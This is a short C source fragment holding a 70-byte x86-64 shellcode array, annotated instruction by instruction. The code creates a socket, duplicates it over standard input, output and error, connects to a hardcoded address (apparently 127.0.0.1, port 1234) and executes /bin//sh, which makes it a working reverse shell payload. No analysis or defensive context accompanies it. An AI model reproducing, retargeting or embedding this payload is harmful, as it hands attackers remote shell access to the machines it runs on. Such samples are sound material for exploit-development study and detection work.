
#define RS_SIZE 70

char RS[] = {
  /* 0000 */ "\x48\xb8\xff\xfd\xfb\x2d\x80\xff\xff\xfe" /* mov rax, 0xfeffff802dfbfdff */
  /* 000A */ "\x48\xf7\xd0"                             /* not rax                     */
  /* 000D */ "\x50"                                     /* push rax                    */
  /* 000E */ "\x54"                                     /* push rsp                    */
  /* 000F */ "\x5d"                                     /* pop rbp                     */
  /* 0010 */ "\x6a\x61"                                 /* push 0x61                   */
  /* 0012 */ "\x58"                                     /* pop rax                     */
  /* 0013 */ "\x99"                                     /* cdq                         */
  /* 0014 */ "\x6a\x01"                                 /* push 0x1                    */
  /* 0016 */ "\x5e"                                     /* pop rsi                     */
  /* 0017 */ "\x6a\x02"                                 /* push 0x2                    */
  /* 0019 */ "\x5f"                                     /* pop rdi                     */
  /* 001A */ "\x0f\x05"                                 /* syscall                     */
  /* 001C */ "\x97"                                     /* xchg edi, eax               */
  /* 001D */ "\x96"                                     /* xchg esi, eax               */
  /* 001E */ "\x6a\x5a"                                 /* push 0x5a                   */
  /* 0020 */ "\x58"                                     /* pop rax                     */
  /* 0021 */ "\x0f\x05"                                 /* syscall                     */
  /* 0023 */ "\xff\xce"                                 /* dec esi                     */
  /* 0025 */ "\x79\xf7"                                 /* jns 0x1e                    */
  /* 0027 */ "\x55"                                     /* push rbp                    */
  /* 0028 */ "\x5e"                                     /* pop rsi                     */
  /* 0029 */ "\xb2\x10"                                 /* mov dl, 0x10                */
  /* 002B */ "\xb0\x62"                                 /* mov al, 0x62                */
  /* 002D */ "\x0f\x05"                                 /* syscall                     */
  /* 002F */ "\x99"                                     /* cdq                         */
  /* 0030 */ "\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68" /* mov rbx, 0x68732f2f6e69622f */
  /* 003A */ "\x52"                                     /* push rdx                    */
  /* 003B */ "\x53"                                     /* push rbx                    */
  /* 003C */ "\x54"                                     /* push rsp                    */
  /* 003D */ "\x5f"                                     /* pop rdi                     */
  /* 003E */ "\x52"                                     /* push rdx                    */
  /* 003F */ "\x57"                                     /* push rdi                    */
  /* 0040 */ "\x54"                                     /* push rsp                    */
  /* 0041 */ "\x5e"                                     /* pop rsi                     */
  /* 0042 */ "\xb0\x3b"                                 /* mov al, 0x3b                */
  /* 0044 */ "\x0f\x05"                                 /* syscall                     */
};